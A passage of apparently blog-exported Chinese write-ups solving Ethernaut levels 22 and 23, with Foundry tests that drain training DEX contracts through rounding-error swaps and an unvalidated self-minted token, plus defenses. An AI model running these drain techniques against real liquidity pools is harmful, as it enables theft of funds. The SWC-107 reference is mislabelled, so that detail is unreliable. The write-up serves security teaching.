TKN2)</li>\n</ul>\n</li>\n</ol>\n<p>现在，我们手上有65个TKN2，而Dex池中只剩下110个TKN1和45个TKN2。我们只需要用45个TKN2就可以换走池里所有的110个TKN1。</p>\n<ol start=\"7\">\n<li><strong>最终交换 (45 TKN2 -&gt; TKN1)</strong>:<ul>\n<li><code>amountOut = (45 * 110) / 45 = 110</code></li>\n<li>Player: (110 TKN1, 20 TKN2)</li>\n<li>Dex: (0 TKN1, 90 TKN2) -&gt; <strong>TKN1 被耗尽！</strong></li>\n</ul>\n</li>\n</ol>\n<p>通过这种方式，我们利用了整数除法的舍入误差，在每次交易中都获得了微小的优势，并最终将这种优势累积到足以清空整个池子。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><p>测试代码将模拟上述的交换流程。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/22_Dex.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DexTest is Test &#123;</span><br><span class=\"line\">    Dex instance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    SwappableToken token1;</span><br><span class=\"line\">    SwappableToken token2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new Dex();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署并设置代币</span><br><span class=\"line\">        token1 = new SwappableToken(address(instance), &quot;Token 1&quot;, &quot;TKN1&quot;, 110);</span><br><span class=\"line\">        token2 = new SwappableToken(address(instance), &quot;Token 2&quot;, &quot;TKN2&quot;, 110);</span><br><span class=\"line\">        instance.setTokens(address(token1), address(token2));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 添加流动性</span><br><span class=\"line\">        token1.approve(address(instance), 100);</span><br><span class=\"line\">        token2.approve(address(instance), 100);</span><br><span class=\"line\">        instance.addLiquidity(address(token1), 100);</span><br><span class=\"line\">        instance.addLiquidity(address(token2), 100);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 发送初始代币给 player</span><br><span class=\"line\">        token1.transfer(player, 10);</span><br><span class=\"line\">        token2.transfer(player, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDexAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 授权 Dex 合约无限量的代币</span><br><span class=\"line\">        token1.approve(address(instance), type(uint256).max);</span><br><span class=\"line\">        token2.approve(address(instance), type(uint256).max);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 执行攻击流程</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 10 TKN1 -&gt; 10 TKN2</span><br><span class=\"line\">        swapAll(address(token2), address(token1)); // 20 TKN2 -&gt; 24 TKN1</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 24 TKN1 -&gt; 30 TKN2</span><br><span class=\"line\">        swapAll(address(token2), address(token1)); // 30 TKN2 -&gt; 41 TKN1</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 41 TKN1 -&gt; 65 TKN2</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 最终一击</span><br><span class=\"line\">        instance.swap(address(token2), address(token1), 45);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证 Dex 中至少一种代币已被耗尽</span><br><span class=\"line\">        bool drained = token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0;</span><br><span class=\"line\">        assertTrue(drained, &quot;Dex should be drained of one token&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 辅助函数，用于交换指定代币的全部余额</span><br><span class=\"line\">    function swapAll(address tokenIn, address tokenOut) internal &#123;</span><br><span class=\"line\">        uint256 balance = IERC20(tokenIn).balanceOf(player);</span><br><span class=\"line\">        instance.swap(tokenIn, tokenOut, balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>授权</strong>: 授权 <code>Dex</code> 合约可以从你的地址转移 <code>Token1</code> 和 <code>Token2</code>。</li>\n<li><strong>反复交换</strong>: 在 <code>Token1</code> 和 <code>Token2</code> 之间来回交换你的全部余额。</li>\n<li><strong>利用误差</strong>: 每次交换都会因为整数除法的舍入而产生微小的利润。</li>\n<li><strong>累积优势</strong>: 重复交换，直到你拥有的代币数量足以一次性换走池中剩余的所有另一种代币。</li>\n<li><strong>最终一击</strong>: 执行最后一次交换，清空池子。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>避免价格操纵</strong>: 简单的 <code>balanceOf(A) / balanceOf(B)</code> 价格公式极易受到操纵。现代DEX（如Uniswap V2）使用 <code>x * y = k</code> 的恒定乘积公式，这使得操纵价格的成本要高得多。</li>\n<li><strong>处理舍入误差</strong>: 在金融计算中，必须仔细处理精度问题。可以考虑：<ul>\n<li>将计算顺序调整为先乘后除，以减少精度损失。</li>\n<li>使用更高精度的数学库，如 <code>SafeMath</code> 或专门的定点数库。</li>\n</ul>\n</li>\n<li><strong>使用去中心化预言机</strong>: 对于需要可靠价格的应用，不应依赖于单个DEX池的瞬时价格。应使用更稳健的价格来源，如 Chainlink 或 Uniswap V3 的时间加权平均价格（TWAP）预言机。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>DEX (去中心化交易所)</strong>: 一种基于智能合约的交易所，允许用户在没有中心化中介的情况下交易加密资产。</li>\n<li><strong>价格预言机 (Price Oracle)</strong>: 为智能合约提供链下或链上资产价格信息的服务。</li>\n<li><strong>整数除法</strong>: Solidity（以及许多其他编程语言）中整数除法向下舍入的特性，是许多数学相关漏洞的根源。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>在智能合约中进行金融计算时，整数除法的舍入误差可能导致严重的漏洞。</li>\n<li>简单的、基于即时流动性的价格发现机制很容易被操纵。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过一系列精心设计的交易，利用并放大整数除法的舍入误差。</li>\n<li>逐渐积累优势，直到能够完全耗尽流动性池。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>使用更成熟和抗操纵的定价模型（如恒定乘积模型）。</li>\n<li>在进行数学运算时，始终注意运算顺序和精度损失问题。</li>\n<li>对于关键应用，依赖于健壮的价格预言机，而不是易受攻击的即时价格。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://uniswap.org/whitepaper.pdf\">Uniswap V2 Whitepaper</a></li>\n<li><a href=\"https://docs.chain.link/docs/get-the-latest-price/\">Chainlink Price Feeds</a></li>\n</ul>\n"},{"title":"Ethernaut Level 23: Dex Two - 任意代币对价格操纵","date":"2025-01-25T09:00:00.000Z","updated":"2025-01-25T09:00:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"利用DEX合约中缺失的代币白名单验证，通过引入一个我们自己创建的、价值极低的代币来操纵交易对的价格。学习如何用一个毫无价值的代币换取池中所有有价值的代币，掌握 Dex Two 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 23: Dex Two - 任意代币对价格操纵\n\n> **关卡链接**: [Ethernaut Level 23 - Dex Two](https://ethernaut.openzeppelin.com/level/23)  \n> **攻击类型**: 价格操纵 / 缺少输入验证  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n与上一关类似，你需要与一个 `Dex` 合约交互。但这次的目标更具挑战性：你需要同时耗尽 `Dex` 合约中 `Token1` **和** `Token2` 的全部流动性。\n\n-   **初始状态**: \n    -   Player: 10 TKN1, 10 TKN2\n    -   Dex: 100 TKN1, 100 TKN2\n\n![Dex Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg)\n\n## 🔍 漏洞分析\n\n`DexTwo` 合约的代码与上一关的 `Dex` 几乎完全相同，但有一个微小却致命的改动。在 `swap` 函数中，一行关键的验证代码被移除了：\n\n```solidity\n// This line was present in Dex, but is missing in DexTwo\n// require((from == token1 && to == token2) || (from == token2 && to == token1), \"Invalid tokens\");\n```\n\n这行代码原本用于确保交易只在 `token1` 和 `token2` 之间进行。由于它被移除了，`DexTwo` 的 `swap` 函数现在可以接受**任何**符合ERC20标准的代币作为交易对的一方。\n\n这就为我们打开了攻击的大门。我们可以创建一个我们自己控制的、毫无价值的“攻击代币”（我们称之为 `Token3`），并用它来操纵与 `Token1` 和 `Token2` 的交易价格。\n\n### 攻击流程\n\n我们的策略是利用我们自己创建的 `Token3` 作为媒介，以极低的价格换取 `Dex` 池中所有的 `Token1` 和 `Token2`。\n\n1.  **创建并分发攻击代币**: 我们创建一个新的ERC20代币 `Token3`，并给自己铸造大量的 `Token3`。\n\n2.  **为 `Token3` 提供“流动性”**: 我们向 `DexTwo` 合约发送极少量的 `Token3`（例如，1个）。现在 `DexTwo` 合约中 `Token3` 的余额为1。\n\n3.  **第一次交换 (Token3 -> Token1)**:\n    *   我们现在用 `Token3` 交换 `Token1`。池中 `Token1` 的余额是100，`Token3` 的余额是1。价格比为 100:1。\n    *   我们只需要发送1个 `Token3`，就可以根据价格公式换取 `(1 * 100) / 1 = 100` 个 `Token1`。\n    *   交换后，`Dex` 池中的 `Token1` 被全部换走。\n\n4.  **第二次交换 (Token3 -> Token2)**:\n    *   现在池中 `Token2` 的余额是100，`Token3` 的余额是2（我们第一次交换时转入了1个，现在又转入了1个）。价格比为 100:2，即 50:1。\n    *   我们发送2个 `Token3`，就可以换取 `(2 * 100) / 2 = 100` 个 `Token2`。\n    *   交换后，`Dex` 池中的 `Token2` 也被全部换走。\n\n通过引入一个我们完全控制的第三方代币，我们成功地操纵了价格，并用极小的代价（总共3个我们自己随意铸造的 `Token3`）清空了整个 `Dex` 池。\n\n## 💻 Foundry 实现\n\n### Foundry 测试代码\n\n测试代码将模拟上述的攻击流程：创建新代币，并用它来耗尽 `DexTwo` 的流动性。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/23_DexTwo.sol\";\n\ncontract DexTwoTest is Test {\n    DexTwo instance;\n    address player;\n    SwappableTokenTwo token1;\n    SwappableTokenTwo token2;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new DexTwo();\n\n        // 部署并设置初始代币\n        token1 = new SwappableTokenTwo(address(instance), \"Token 1\", \"TKN1\", 110);\n        token2 = new SwappableTokenTwo(address(instance), \"Token 2\", \"TKN2\", 110);\n        instance.setTokens(address(token1), address(token2));\n\n        // 添加流动性并发送初始代币给 player\n        token1.approve(address(instance), 100);\n        token2.approve(address(instance), 100);\n        instance.add_liquidity(address(token1), 100);\n        instance.add_liquidity(address(token2), 100);\n        token1.transfer(player, 10);\n        token2.transfer(player, 10);\n    }\n\n    function testDexTwoAttack() public {\n        vm.startPrank(player);\n\n        // 1. 部署我们自己的恶意代币\n        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(instance), \"Attack Token\", \"ATK\", 400);\n        attackToken.approve(address(instance), type(uint256).max);\n\n        // 2. 向 Dex 提供极少量的恶意代币流动性\n        attackToken.transfer(address(instance), 1);\n\n        // 3. 用1个恶意代币换走所有 Token1\n        uint256 dexT1Balance = token1.balanceOf(address(instance));\n        uint256 swapAmount1 = instance.get_swap_price(address(attackToken), address(token1), 1);\n        assertEq(swapAmount1, dexT1Balance, \"Price should allow draining Token1\");\n        instance.swap(address(attackToken), address(token1), 1);\n\n        // 4. 用2个恶意代币换走所有 Token2\n        uint256 dexT2Balance = token2.balanceOf(address(instance));\n        uint256 swapAmount2 = instance.get_swap_price(address(attackToken), address(token2), 2);\n        assertEq(swapAmount2, dexT2Balance, \"Price should allow draining Token2\");\n        instance.swap(address(attackToken), address(token2), 2);\n\n        // 5. 验证 Dex 的两种代币都已被耗尽\n        bool drained = token1.balanceOf(address(instance)) == 0 && token2.balanceOf(address(instance)) == 0;\n        assertTrue(drained, \"Dex should be drained of both tokens\");\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **识别漏洞**: 发现 `swap` 函数缺少对交易代币的白名单验证。\n2.  **创建攻击代币**: 部署一个我们自己控制的ERC20代币。\n3.  **注入虚假流动性**: 向 `DexTwo` 合约发送极少量的攻击代币，以建立一个极不平衡的交易对。\n4.  **耗尽Token1**: 用少量攻击代币交换 `DexTwo` 中所有的 `Token1`。\n5.  **耗尽Token2**: 再次用少量攻击代币交换 `DexTwo` 中所有的 `Token2`。\n\n## 🛡️ 防御措施\n\n1.  **严格的输入验证**: 这是最关键的防御措施。合约必须严格验证所有外部输入，特别是那些决定核心逻辑的参数，如本例中的代币地址。\n\n    ```solidity\n    // 修复建议：加回被移除的验证\n    function swap(address from, address to, uint amount) public {\n        require((from == token1 && to == token2) || (from == token2 && to == token1), \"Invalid tokens\");\n        // ... a reste of the swap logic\n    }\n    ```\n\n2.  **使用白名单**: 对于允许哪些代币参与交互的系统，应维护一个可信代币的白名单，并对所有传入的代币地址进行检查。\n\n## 🔧 相关工具和技术\n\n-   **输入验证**: 智能合约安全中最基本也是最重要的原则之一。永远不要相信来自外部的输入。\n-   **代币白名单**: 一种常见的安全模式，用于限制系统只与预先批准的、受信任的代币合约进行交互。\n\n## 🎯 总结\n\n**核心概念**:\n-   缺少对输入参数（如代币地址）的验证是一个严重的安全漏洞。\n-   在去中心化交易所（DEX）中，如果允许任意代币参与交易，攻击者可以通过引入自己控制的代币来轻易地操纵价格。\n\n**攻击向量**:\n-   创建一个新的、由攻击者完全控制的ERC20代币。\n-   将这个新代币与目标代币在一个缺乏验证的DEX中形成交易对。\n-   利用极不平衡的流动性比例，以极低的价格换取所有目标代幣。\n\n**防御策略**:\n-   对所有函数的输入参数进行严格的白名单或有效性检查。\n-   确保核心业务逻辑（如交易）只能在预期的、受信任的资产之间进行。\n\n## 📚 参考资料\n\n-   [SWC-107: Unchecked External Call](https://swcregistry.io/docs/SWC-107) (虽然本例是缺少验证，但根源都是对外部输入/合约的不信任)\n-   [Secureum: Input Validation](https://secureum.substack.com/p/security-pitfalls-and-best-practices-101)","source":"_posts/ethernaut-level-23-dex-two.md","raw":"---\ntitle: 'Ethernaut Level 23: Dex Two - 任意代币对价格操纵'\ndate: 2025-01-25 17:00:00\nupdated: 2025-01-25 17:00:00\ncategories:\n  - Ethernaut 系列\n  - 高级攻击篇 (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - DEX\n  - Price Manipulation\n  - Token Validation\n  - 智能合约安全\nseries: Ethernaut Foundry Solutions\nexcerpt: \"利用DEX合约中缺失的代币白名单验证，通过引入一个我们自己创建的、价值极低的代币来操纵交易对的价格。学习如何用一个毫无价值的代币换取池中所有有价值的代币，掌握 Dex Two 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 23: Dex Two - 任意代币对价格操纵\n\n> **关卡链接**: [Ethernaut Level 23 - Dex Two](https://ethernaut.openzeppelin.com/level/23)  \n> **攻击类型**: 价格操纵 / 缺少输入验证  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n与上一关类似，你需要与一个 `Dex` 合约交互。但这次的目标更具挑战性：你需要同时耗尽 `Dex` 合约中 `Token1` **和** `Token2` 的全部流动性。\n\n-   **初始状态**: \n    -   Player: 10 TKN1, 10 TKN2\n    -   Dex: 100 TKN1, 100 TKN2\n\n![Dex Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg)\n\n## 🔍 漏洞分析\n\n`DexTwo` 合约的代码与上一关的 `Dex` 几乎完全相同，但有一个微小却致命的改动。在 `swap` 函数中，一行关键的验证代码被移除了：\n\n```solidity\n// This line was present in Dex, but is missing in DexTwo\n// require((from == token1 && to == token2) || (from == token2 && to == token1), \"Invalid tokens\");\n```\n\n这行代码原本用于确保交易只在 `token1` 和 `token2` 之间进行。由于它被移除了，`DexTwo` 的 `swap` 函数现在可以接受**任何**符合ERC20标准的代币作为交易对的一方。\n\n这就为我们打开了攻击的大门。我们可以创建一个我们自己控制的、毫无价值的“攻击代币”（我们称之为 `Token3`），并用它来操纵与 `Token1` 和 `Token2` 的交易价格。\n\n### 攻击流程\n\n我们的策略是利用我们自己创建的 `Token3` 作为媒介，以极低的价格换取 `Dex` 池中所有的 `Token1` 和 `Token2`。\n\n1.  **创建并分发攻击代币**: 我们创建一个新的ERC20代币 `Token3`，并给自己铸造大量的 `Token3`。\n\n2.  **为 `Token3` 提供“流动性”**: 我们向 `DexTwo` 合约发送极少量的 `Token3`（例如，1个）。现在 `DexTwo` 合约中 `Token3` 的余额为1。\n\n3.  **第一次交换 (Token3 -> Token1)**:\n    *   我们现在用 `Token3` 交换 `Token1`。池中 `Token1` 的余额是100，`Token3` 的余额是1。价格比为 100:1。\n    *   我们只需要发送1个 `Token3`，就可以根据价格公式换取 `(1 * 100) / 1 = 100` 个 `Token1`。\n    *   交换后，`Dex` 池中的 `Token1` 被全部换走。\n\n4.  **第二次交换 (Token3 -> Token2)**:\n    *   现在池中 `Token2` 的余额是100，`Token3` 的余额是2（我们第一次交换时转入了1个，现在又转入了1个）。价格比为 100:2，即 50:1。\n    *   我们发送2个 `Token3`，就可以换取 `(2 * 100) / 2 = 100` 个 `Token2`。\n    *   交换后，`Dex` 池中的 `Token2` 也被全部换走。\n\n通过引入一个我们完全控制的第三方代币，我们成功地操纵了价格，并用极小的代价（总共3个我们自己随意铸造的 `Token3`）清空了整个 `Dex` 池。\n\n## 💻 Foundry 实现\n\n### Foundry 测试代码\n\n测试代码将模拟上述的攻击流程：创建新代币，并用它来耗尽 `DexTwo` 的流动性。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/23_DexTwo.sol\";\n\ncontract DexTwoTest is Test {\n    DexTwo instance;\n    address player;\n    SwappableTokenTwo token1;\n    SwappableTokenTwo token2;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new DexTwo();\n\n        // 部署并设置初始代币\n        token1 = new SwappableTokenTwo(address(instance), \"Token 1\", \"TKN1\", 110);\n        token2 = new SwappableTokenTwo(address(instance), \"Token 2\", \"TKN2\", 110);\n        instance.setTokens(address(token1), address(token2));\n\n        // 添加流动性并发送初始代币给 player\n        token1.approve(address(instance), 100);\n        token2.approve(address(instance), 100);\n        instance.add_liquidity(address(token1), 100);\n        instance.add_liquidity(address(token2), 100);\n        token1.transfer(player, 10);\n        token2.transfer(player, 10);\n    }\n\n    function testDexTwoAttack() public {\n        vm.startPrank(player);\n\n        // 1. 部署我们自己的恶意代币\n        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(instance), \"Attack Token\", \"ATK\", 400);\n        attackToken.approve(address(instance), type(uint256).max);\n\n        // 2. 向 Dex 提供极少量的恶意代币流动性\n        attackToken.transfer(address(instance), 1);\n\n        // 3. 用1个恶意代币换走所有 Token1\n        uint256 dexT1Balance = token1.balanceOf(address(instance));\n        uint256 swapAmount1 = instance.get_swap_price(address(attackToken), address(token1), 1);\n        assertEq(swapAmount1, dexT1Balance, \"Price should allow draining Token1\");\n        instance.swap(address(attackToken), address(token1), 1);\n\n        // 4. 用2个恶意代币换走所有 Token2\n        uint256 dexT2Balance = token2.balanceOf(address(instance));\n        uint256 swapAmount2 = instance.get_swap_price(address(attackToken), address(token2), 2);\n        assertEq(swapAmount2, dexT2Balance, \"Price should allow draining Token2\");\n        instance.swap(address(attackToken), address(token2), 2);\n\n        // 5. 验证 Dex 的两种代币都已被耗尽\n        bool drained = token1.balanceOf(address(instance)) == 0 && token2.balanceOf(address(instance)) == 0;\n        assertTrue(drained, \"Dex should be drained of both tokens\");\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **识别漏洞**: 发现 `swap` 函数缺少对交易代币的白名单验证。\n2.  **创建攻击代币**: 部署一个我们自己控制的ERC20代币。\n3.  **注入虚假流动性**: 向 `DexTwo` 合约发送极少量的攻击代币，以建立一个极不平衡的交易对。\n4.  **耗尽Token1**: 用少量攻击代币交换 `DexTwo` 中所有的 `Token1`。\n5.  **耗尽Token2**: 再次用少量攻击代币交换 `DexTwo` 中所有的 `Token2`。\n\n## 🛡️ 防御措施\n\n1.  **严格的输入验证**: 这是最关键的防御措施。合约必须严格验证所有外部输入，特别是那些决定核心逻辑的参数，如本例中的代币地址。\n\n    ```solidity\n    // 修复建议：加回被移除的验证\n    function swap(address from, address to, uint amount) public {\n        require((from == token1 && to == token2) || (from == token2 && to == token1), \"Invalid tokens\");\n        // ... a reste of the swap logic\n    }\n    ```\n\n2.  **使用白名单**: 对于允许哪些代币参与交互的系统，应维护一个可信代币的白名单，并对所有传入的代币地址进行检查。\n\n## 🔧 相关工具和技术\n\n-   **输入验证**: 智能合约安全中最基本也是最重要的原则之一。永远不要相信来自外部的输入。\n-   **代币白名单**: 一种常见的安全模式，用于限制系统只与预先批准的、受信任的代币合约进行交互。\n\n## 🎯 总结\n\n**核心概念**:\n-   缺少对输入参数（如代币地址）的验证是一个严重的安全漏洞。\n-   在去中心化交易所（DEX）中，如果允许任意代币参与交易，攻击者可以通过引入自己控制的代币来轻易地操纵价格。\n\n**攻击向量**:\n-   创建一个新的、由攻击者完全控制的ERC20代币。\n-   将这个新代币与目标代币在一个缺乏验证的DEX中形成交易对。\n-   利用极不平衡的流动性比例，以极低的价格换取所有目标代幣。\n\n**防御策略**:\n-   对所有函数的输入参数进行严格的白名单或有效性检查。\n-   确保核心业务逻辑（如交易）只能在预期的、受信任的资产之间进行。\n\n## 📚 参考资料\n\n-   [SWC-107: Unchecked External Call](https://swcregistry.io/docs/SWC-107) (虽然本例是缺少验证，但根源都是对外部输入/合约的不信任)\n-   [Secureum: Input Validation](https://secureum.substack.com/p/security-pitfalls-and-best-practices-101)","slug":"ethernaut-level-23-dex-two","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpk001pbf5qa0wwgyf5","content":"<h1 id=\"🎯-Ethernaut-Level-23-Dex-Two-任意代币对价格操纵\"><a href=\"#🎯-Ethernaut-Level-23-Dex-Two-任意代币对价格操纵\" class=\"headerlink\" title=\"🎯 Ethernaut Level 23: Dex Two - 任意代币对价格操纵\"></a>🎯 Ethernaut Level 23: Dex Two - 任意代币对价格操纵</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/23\">Ethernaut Level 23 - Dex Two</a><br><strong>攻击类型</strong>: 价格操纵 &#x2F; 缺少输入验证<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>与上一关类似，你需要与一个 <code>Dex</code> 合约交互。但这次的目标更具挑战性：你需要同时耗尽 <code>Dex</code> 合约中 <code>Token1</code> <strong>和</strong> <code>Token2</code> 的全部流动性。</p>\n<ul>\n<li><strong>初始状态</strong>: <ul>\n<li>Player: 10 TKN1, 10 TKN2</li>\n<li>Dex: 100 TKN1, 100 TKN2</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg\" alt=\"Dex Two Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p><code>DexTwo</code> 合约的代码与上一关的 <code>Dex</code> 几乎完全相同，但有一个微小却致命的改动。在 <code>swap</code> 函数中，一行关键的验证代码被移除了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// This line was present in Dex, but is missing in DexTwo</span><br><span class=\"line\">// require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>这行代码原本用于确保交易只在 <code>token1</code> 和 <code>token2</code> 之间进行。由于它被移除了，<code>DexTwo</code> 的 <code>swap</code> 函数现在可以接受<strong>任何</strong>符合ERC20标准的代币作为交易对的一方。</p>\n<p>这就为我们打开了攻击的大门。我们可以创建一个我们自己控制的、毫无价值的“攻击代币”（我们称之为 <code>Token3</code>），并用它来操纵与 <code>Token1</code> 和 <code>Token2</code> 的交易价格。</p>\n<h3 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h3><p>我们的策略是利用我们自己创建的 <code>Token3</code> 作为媒介，以极低的价格换取 <code>Dex</code> 池中所有的 <code>Token1</code> 和 <code>Token2</code>。</p>\n<ol>\n<li><p><strong>创建并分发攻击代币</strong>: 我们创建一个新的ERC20代币 <code>Token3</code>，并给自己铸造大量的 <code>Token3</code>。</p>\n</li>\n<li><p><strong>为 <code>Token3</code> 提供“流动性”</strong>: 我们向 <code>DexTwo</code> 合约发送极少量的 <code>Token3</code>（例如，1个）。现在 <code>DexTwo</code> 合约中 <code>Token3</code> 的余额为1。</p>\n</li>\n<li><p><strong>第一次交换 (Token3 -&gt; Token1)</strong>:</p>\n<ul>\n<li>我们现在用 <code>Token3</code> 交换 <code>Token1</code>。池中 <code>Token1</code> 的余额是100，<code>Token3</code> 的余额是1。价格比为 100:1。</li>\n<li>我们只需要发送1个 <code>Token3</code>，就可以根据价格公式换取 <code>(1 * 100) / 1 = 100</code> 个 <code>Token1</code>。</li>\n<li>交换后，<code>Dex</code> 池中的 <code>Token1</code> 被全部换走。</li>\n</ul>\n</li>\n<li><p><strong>第二次交换 (Token3 -&gt; Token2)</strong>:</p>\n<ul>\n<li>现在池中 <code>Token2</code> 的余额是100，<code>Token3</code> 的余额是2（我们第一次交换时转入了1个，现在又转入了1个）。价格比为 100:2，即 50:1。</li>\n<li>我们发送2个 <code>Token3</code>，就可以换取 <code>(2 * 100) / 2 = 100</code> 个 <code>Token2</code>。</li>\n<li>交换后，<code>Dex</code> 池中的 <code>Token2</code> 也被全部换走。</li>\n</ul>\n</li>\n</ol>\n<p>通过引入一个我们完全控制的第三方代币，我们成功地操纵了价格，并用极小的代价（总共3个我们自己随意铸造的 <code>Token3</code>）清空了整个 <code>Dex</code> 池。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><p>测试代码将模拟上述的攻击流程：创建新代币，并用它来耗尽 <code>DexTwo</code> 